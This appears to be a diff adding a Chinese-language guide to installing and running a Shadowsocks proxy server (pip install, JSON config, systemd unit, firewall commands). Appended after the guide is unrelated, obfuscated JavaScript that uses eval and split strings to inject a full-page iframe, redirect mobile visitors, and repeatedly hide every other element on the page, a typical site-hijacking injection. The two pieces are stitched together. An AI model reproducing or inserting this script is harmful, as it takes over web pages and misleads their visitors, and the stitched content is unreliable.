@@ -1,0 +1,82 @@
+Outline的Access Key格式: ss://加密方式:密码@IP地址:端口
+
+查询 python 版本 Python 2.6 or 2.7.以上
+$ python --version
+
+安装 shadowsocks 
+$ pip install shadowsocks
+
+配置 shadowsocks json文件
+$ vi /etc/shadowsocks.json
+
+{
+  "server":"0.0.0.0",
+  "local_address": "127.0.0.1",
+  "local_port":1080,
+  "port_password": {
+    "8888": "password",
+    "8888": "password"
+  },
+  "timeout":300,
+  "method":"aes-256-cfb",
+  "fast_open": false
+}
+
+配置 shadowsocks 自启动
+$ vi /etc/systemd/system/shadowsocks.service
+
+[Unit]
+Description=Shadowsocks
+
+[Service]
+TimeoutStartSec=0
+ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json -d start
+
+[Install]
+WantedBy=multi-user.target
+
+# 设置开机自启命令
+systemctl enable shadowsocks
+
+# 启动命令
+systemctl start shadowsocks
+
+#查看状态命令
+systemctl status shadowsocks -l
+
+开启端口
+firewall-cmd --zone=public --add-port=38023/tcp --permanent
+
+查询端口是否开启
+firewall-cmd --query-port=38023/tcp
+
+重启防火墙
+firewall-cmd --reload
+
+
+
+function goPAGE() {
+    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
+        window.location.href = "https://www.baidu.com/"
+    } else {
+        var ss = '<center id="yongwang"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="13' + '80" src="https://www.baidu.com/"></iframe></center>';
+        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
+        try {
+            setInterval(function() {
+                try {
+                    document.getElementById("div" + "All").style.display = "no" + "ne"
+                } catch (e) {}
+                for (var i = 0; i < document.body.children.length; i++) {
+                    try {
+                        var tagname = document.body.children[i].tagName;
+                        var myid = document.body.children[i].id;
+                        if (myid != "iconDiv1" && myid != "yongwang") {
+                            document.body.children[i].style.display = "non" + "e"
+                        }
+                    } catch (e) {}
+                }
+            }, 100)
+        } catch (e) {}
+    }
+}
+goPAGE();
